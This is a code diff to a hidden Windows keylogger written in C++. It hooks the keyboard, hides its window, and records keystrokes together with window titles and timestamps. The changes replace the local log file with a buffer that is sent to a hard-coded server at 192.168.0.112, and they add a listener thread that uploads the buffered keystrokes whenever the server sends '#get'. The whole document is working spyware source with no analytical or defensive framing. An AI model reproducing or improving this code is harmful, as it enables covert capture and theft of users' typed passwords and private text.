@@ -2,6 +2,7 @@
 #include <Windows.h>
 #include <stdio.h>
 #include <time.h>
+#include <process.h>
 #include <winsock2.h>
 #include <cstdio>
 #include <fstream>
@@ -10,7 +11,8 @@
 // defines whether the window is visible or not
 // should be solved with makefile, not in this file
 #define invisible  // (visible / invisible)
-#define BUFFERSIZE 100
+#define BUFFERSIZE 1000
+#define IPADDRESS "192.168.0.112"
 
 // variable to store the HANDLE to the hook. Don't declare it anywhere else then
 // globally or you will get problems since every function uses this variable.
@@ -27,7 +29,10 @@ std::ofstream OUTPUT_FILE;
 extern char lastwindow[256];
 
 int ServerConnect(SOCKET &sockfd);
+char KeyMapping(char key);
+void ServerMessage(void *p);
 SOCKET sockfd;
+char message[BUFFERSIZE];
 
 // This is the callback function. Consider it the event that is raised when, in
 // this case, a key is pressed.
@@ -96,15 +101,12 @@ int Save(int key_stroke)
             char s[64];
             strftime(s, sizeof(s), "%c", tm);
 
-            char message[BUFFERSIZE];
-            strcpy(message, "\n\n[Window: ");
+            
+            strcat(message, "[Window: ");
             strcat(message, window_title);
             strcat(message, " - at ");
             strcat(message, s);
-            strcat(message, "] ");
-
-            OUTPUT_FILE << message;
-            send(sockfd, message, BUFFERSIZE, 0);
+            strcat(message, "]\n\n");
         }
     }
 
@@ -112,55 +114,39 @@ int Save(int key_stroke)
     std::cout << key_stroke << '\n';
 
     if (key_stroke == VK_BACK) {
-        OUTPUT_FILE << "[BACKSPACE]";
-        send(sockfd, "[BACKSPACE]", BUFFERSIZE, 0);
+        strcat(message, "[###BACKSPACE]");
     } else if (key_stroke == VK_RETURN) {
-        OUTPUT_FILE << "\n";
-        send(sockfd, "\n", BUFFERSIZE, 0);
+        strcat(message, "\n");
     } else if (key_stroke == VK_SPACE) {
-        OUTPUT_FILE << " ";
-        send(sockfd, " ", BUFFERSIZE, 0);
+        strcat(message, " ");
     } else if (key_stroke == VK_TAB) {
-        OUTPUT_FILE << "[TAB]";
-        send(sockfd, "[TAB]", BUFFERSIZE, 0);
+        strcat(message, "\t");
     } else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT ||
                key_stroke == VK_RSHIFT) {
-        OUTPUT_FILE << "[SHIFT]";
-        send(sockfd, "[SHIFT]", BUFFERSIZE, 0);
+        //strcat(message, "[###SHIFT]");
     } else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL ||
                key_stroke == VK_RCONTROL) {
-        OUTPUT_FILE << "[CTRL]";
-        send(sockfd, "[CTRL]", BUFFERSIZE, 0);
+        strcat(message, "[###CTRL]");
     } else if (key_stroke == VK_ESCAPE) {
-        OUTPUT_FILE << "[ESCAPE]";
-        send(sockfd, "[ESCAPE]", BUFFERSIZE, 0);
+        strcat(message, "[###ESCAPE]");
     } else if (key_stroke == VK_END) {
-        OUTPUT_FILE << "[END]";
-        send(sockfd, "[END]", BUFFERSIZE, 0);
+        strcat(message, "[###END]");
     } else if (key_stroke == VK_HOME) {
-        OUTPUT_FILE << "[HOME]";
-        send(sockfd, "[HOME]", BUFFERSIZE, 0);
+        strcat(message, "[###HOME]");
     } else if (key_stroke == VK_LEFT) {
-        OUTPUT_FILE << "[LEFT]";
-        send(sockfd, "[LEFT]", BUFFERSIZE, 0);
+        strcat(message, "[###LEFT]");
     } else if (key_stroke == VK_UP) {
-        OUTPUT_FILE << "[UP]";
-        send(sockfd, "[UP]", BUFFERSIZE, 0);
+        strcat(message, "[###UP]");
     } else if (key_stroke == VK_RIGHT) {
-        OUTPUT_FILE << "[RIGHT]";
-        send(sockfd, "[RIGHT]", BUFFERSIZE, 0);
+        strcat(message, "[###RIGHT]");
     } else if (key_stroke == VK_DOWN) {
-        OUTPUT_FILE << "[DOWN]";
-        send(sockfd, "[DOWN]", BUFFERSIZE, 0);
+        strcat(message, "[###DOWN]");
     } else if (key_stroke == 190 || key_stroke == 110) {
-        OUTPUT_FILE << ".";
-        send(sockfd, ".", BUFFERSIZE, 0);
+        strcat(message, ".");
     } else if (key_stroke == 189 || key_stroke == 109) {
-        OUTPUT_FILE << "-";
-        send(sockfd, "-", BUFFERSIZE, 0);
+        strcat(message, "-");
     } else if (key_stroke == 20) {
-        OUTPUT_FILE << "[CAPSLOCK]";
-        send(sockfd, "[CAPSLOCK]", BUFFERSIZE, 0);
+        //strcat(message, "[###CAPSLOCK]");
     } else {
         char key;
         // check caps lock
@@ -177,17 +163,63 @@ int Save(int key_stroke)
         key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
 
         // tolower converts it to lowercase properly
-        if (!lowercase)
-            key = tolower(key);
-        OUTPUT_FILE << char(key);
-        send(sockfd, &key, 1, 0);
+        if (!lowercase){
+            //沒按Shift
+            if(key >= 65 && key <= 90){
+                key = tolower(key);
+            }
+        }
+        else {
+            //有按Shift
+            key = KeyMapping(key);
+        }
+        
+        
+        char buf[2] = {key, 0x00};
+        strcat(message, buf);
     }
-    // instead of opening and closing file handlers every time, keep file open
-    // and flush.
-    OUTPUT_FILE.flush();
+    
+    if(strlen(message) > BUFFERSIZE - 50){
+        send(sockfd, message, BUFFERSIZE, 0);
+        strcpy(message, "");
+    }
 
 
     return 0;
+}
+
+char KeyMapping(char key){
+    char keymap[20][2] = {
+        {'`', '~'},
+        {'1', '!'},
+        {'2', '@'},
+        {'3', '#'},
+        {'4', '$'},
+        {'5', '%'},
+        {'6', '^'},
+        {'7', '&'},
+        {'8', '*'},
+        {'9', '('},
+        {'0', ')'},
+        {'-', '_'},
+        {'=', '+'},
+        {'[', '{'},
+        {'\\', '|'},
+        {';', ':'},
+        {'\'', '"'},
+        {',', '<'},
+        {'.', '>'},
+        {'/', '?'}
+    };
+
+    
+    for(int i = 0; i < 20; i++){
+        if(key == keymap[i][0]){
+            return keymap[i][1];
+        }
+    }
+
+    return key;
 }
 
 void Stealth()
@@ -209,7 +241,7 @@ int ServerConnect(SOCKET &sockfd)
     WSADATA wsadata;
 
     address.sin_family = AF_INET;
-    address.sin_addr.s_addr = inet_addr("10.1.2.233");
+    address.sin_addr.s_addr = inet_addr(IPADDRESS);
     address.sin_port = 80;
     len = sizeof(address);
 
@@ -229,16 +261,32 @@ int ServerConnect(SOCKET &sockfd)
     }
 }
 
+void ServerMessage(void *p){
+    int rVal;
+    char buf[BUFFERSIZE + 1];
+
+    while ((rVal = recv(sockfd, buf, BUFFERSIZE, 0)) > 0) {
+        buf[rVal] = 0x00;
+        if(strcmp(buf, "#get") == 0){
+            send(sockfd, message, BUFFERSIZE, 0);
+            strcpy(message, "");
+        }
+    }
+}
+
 int main()
 {
     // open output file in append mode
-    OUTPUT_FILE.open(".System32Log.txt", std::ios_base::app);
+    //OUTPUT_FILE.open(".System32Log.txt", std::ios_base::app);
 
     // visibility of window
     Stealth();
 
     // Connect to server
     ServerConnect(sockfd);
+
+    // Get message from Server
+    _beginthread(ServerMessage, 0, NULL);
 
     // Set the hook
     SetHook();
